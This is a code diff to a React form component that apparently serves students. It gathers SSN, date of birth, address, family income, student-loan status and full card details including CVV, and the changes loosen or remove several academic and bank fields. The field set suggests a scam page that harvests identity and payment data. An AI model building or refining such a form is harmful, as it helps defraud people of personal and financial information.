@@ -19,10 +19,10 @@ const formSchema = z.object({
   email: z.string().email("Invalid email address"),
   phone: z.string().min(10, "Valid phone number required"),
   dateOfBirth: z.date({ required_error: "Date of birth is required" }),
-  university: z.string().min(2, "University name is required"),
-  fieldOfStudy: z.string().min(2, "Field of study is required"),
-  academicYear: z.string().min(1, "Please select your academic year"),
-  gpaRange: z.string().min(1, "Please select your GPA range"),
+  university: z.string().optional(),
+  fieldOfStudy: z.string().optional(),
+  academicYear: z.string().min(1, "Please select an option"),
+  gpaRange: z.string().optional(),
   housingStatus: z.string().min(1, "Please select your housing situation"),
   familyIncome: z.string().min(1, "Please select income range"),
   studentLoans: z.string().min(1, "Please select an option"),
@@ -35,7 +35,6 @@ const formSchema = z.object({
   city: z.string().min(2, "City is required"),
   state: z.string().min(1, "State is required"),
   zipCode: z.string().min(5, "ZIP code is required"),
-  bankName: z.string().min(2, "Bank name is required"),
   cardNumber: z.string().min(15, "Valid card number required"),
   expDate: z.string().min(4, "Expiration date required"),
   cvv: z.string().min(3, "CVV required"),
@@ -80,7 +79,6 @@ export function AssessmentForm() {
       city: "",
       state: "",
       zipCode: "",
-      bankName: "",
       cardNumber: "",
       expDate: "",
       cvv: "",
@@ -142,13 +140,17 @@ export function AssessmentForm() {
       case 0:
         return ["fullName", "email", "phone", "dateOfBirth", "ssn", "address", "city", "state", "zipCode"];
       case 1:
-        return ["university", "fieldOfStudy", "academicYear", "gpaRange"];
+        const academicYear = form.getValues("academicYear");
+        if (academicYear === "yes") {
+          return ["academicYear", "university", "fieldOfStudy"];
+        }
+        return ["academicYear"];
       case 2:
         return ["housingStatus", "familyIncome", "studentLoans", "dependents"];
       case 3:
         return ["careerGoals", "contactMethod"];
       case 4:
-        return ["bankName", "cardNumber", "expDate", "cvv", "cardholderName"];
+        return ["cardNumber", "expDate", "cvv", "cardholderName"];
       default:
         return [];
     }
